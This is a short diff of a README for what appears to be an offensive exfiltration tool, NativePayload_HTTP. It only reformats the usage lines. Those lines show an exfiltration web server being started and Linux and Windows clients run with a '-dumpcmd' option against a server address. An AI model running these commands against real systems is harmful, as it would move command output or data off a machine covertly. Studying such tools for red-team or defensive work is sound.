@@ -7,12 +7,14 @@ Server-Side (linux only):
 ./NativePayload_HTTP.sh -exfilwebserver
 
 Client-Side (linux):
-./NativePayload_HTTP.sh -dumpcmd [ServerIPv4] [Port] [Internal-delay]
-Example: ./NativePayload_HTTP.sh -dumpcmd  192.168.56.1 80 0.4
+./NativePayload_HTTP.sh  -dumpcmd  [ServerIPv4]  [Port]  [Internal-delay]
+
+Example: ./NativePayload_HTTP.sh  -dumpcmd   192.168.56.1  80  0.4
 
 Client-Side (windows):
-NativePayload_HTTP.exe -dumpcmd [ServerIPv4] [Port] 
-Example: NativePayload_HTTP.exe -dumpcmd  192.168.56.1 80 
+NativePayload_HTTP.exe  -dumpcmd  [ServerIPv4]  [Port] 
+
+Example: NativePayload_HTTP.exe  -dumpcmd  192.168.56.1 80 
 
 # Note: for more information and help (step by step) , Please read these PDF files:
 
